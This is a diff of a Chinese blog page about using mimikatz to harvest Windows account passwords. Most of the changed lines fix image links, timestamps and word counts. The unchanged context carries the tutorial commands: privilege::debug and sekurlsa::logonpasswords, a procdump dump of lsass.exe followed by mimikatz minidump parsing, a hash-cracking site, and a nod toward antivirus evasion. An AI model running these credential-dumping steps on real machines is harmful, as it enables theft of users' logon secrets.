@@ -25,12 +25,14 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524140354511.png">
 <meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524135921116.png">
-<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图%202022-05-24%20095447.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图095447.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE101038.png">
 <meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524102018844.png">
-<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图%202022-05-24%20103347.png">
-<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图%202022-05-24%20103717.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE103254-16533604085481.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图103347.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图103717.png">
 <meta property="article:published_time" content="2022-05-24T08:20:16.000Z">
-<meta property="article:modified_time" content="2022-05-24T08:21:33.133Z">
+<meta property="article:modified_time" content="2022-05-24T08:28:50.111Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="mimikatz">
 <meta name="twitter:card" content="summary_large_image">
@@ -216,7 +218,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.2k 字
+      1.1k 字
     </span>
   
 
@@ -225,7 +227,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11 分钟
+      10 分钟
     </span>
   
 
@@ -266,27 +268,27 @@
 <p>然后依次执行</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">privilege::debug                <span class="hljs-regexp">//</span>提升至debug权限<br>sekurlsa::logonpasswords        <span class="hljs-regexp">//</span>抓取密码<br><br>或者<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt <span class="hljs-keyword">exit</span>          <span class="hljs-regexp">//</span>结果输出到pssword.txt<br></code></pre></td></tr></table></figure>
 
-<img src="屏幕截图 2022-05-24 095447.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-05-24 095447" style="zoom: 67%;" />
+<img src="屏幕截图095447.png" srcset="/img/loading.gif" lazyload alt="屏幕截图095447" style="zoom: 67%;" />
 
 <p>Windows10比较麻烦，执行命令后需要将相应SHA1值解密，获取密码</p>
 <p>（网上有人说可以通过修改注册表的方式抓取明文，尝试后发现显示 _TBAL_并没有显示明文密码，不知道哪里出的问题）</p>
-<p>![屏幕截图 2022-05-24 101038](屏幕截图 2022-05-24 101038.png)</p>
+<p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE101038.png" srcset="/img/loading.gif" lazyload alt="屏幕截图101038"></p>
 <p>解码网站：<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
 <p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524102018844.png" srcset="/img/loading.gif" lazyload alt="image-20220524102018844"></p>
 <h3 id="Procdump-mimikatz配合抓取密码"><a href="#Procdump-mimikatz配合抓取密码" class="headerlink" title="Procdump+mimikatz配合抓取密码"></a>Procdump+mimikatz配合抓取密码</h3><p>mimikatz容易被杀软查杀，而<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软官方的应用程序，文件本身不会被查杀</p>
 <p>但测试过程中执行相应命令，Microsoft Defender报毒</p>
-<p>![屏幕截图 2022-05-24 103254](屏幕截图 2022-05-24 103254-16533604085481.png)</p>
+<p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE103254-16533604085481.png" srcset="/img/loading.gif" lazyload alt="屏幕截图103254"></p>
 <p>所以之后还要重点考虑<strong>mimikatz的免杀策略</strong>，网上有很多相应的文章</p>
 <p>采用Procdump获取内存文件lsass.exe进程 (它用于本地安全和登陆策略) 中存储的登录密码并转储到lsass.dmp文件中，之后我们就可以使用mimikatz去读取lsass.dmp获取到密码</p>
 <p>生成转储文件lsass.dmp</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure>
 
-<img src="屏幕截图 2022-05-24 103347.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-05-24 103347" style="zoom: 80%;" />
+<img src="屏幕截图103347.png" srcset="/img/loading.gif" lazyload alt="屏幕截图103347" style="zoom: 80%;" />
 
 <p>mimikatz读取转储文件</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure>
 
-<img src="屏幕截图 2022-05-24 103717.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-05-24 103717" style="zoom:80%;" />
+<img src="屏幕截图103717.png" srcset="/img/loading.gif" lazyload alt="屏幕截图103717" style="zoom:80%;" />
 
 <p>然后就可以解码得到的SHA1值</p>
 <p>工具很强大不搞渗透简单了解一下算了</p>
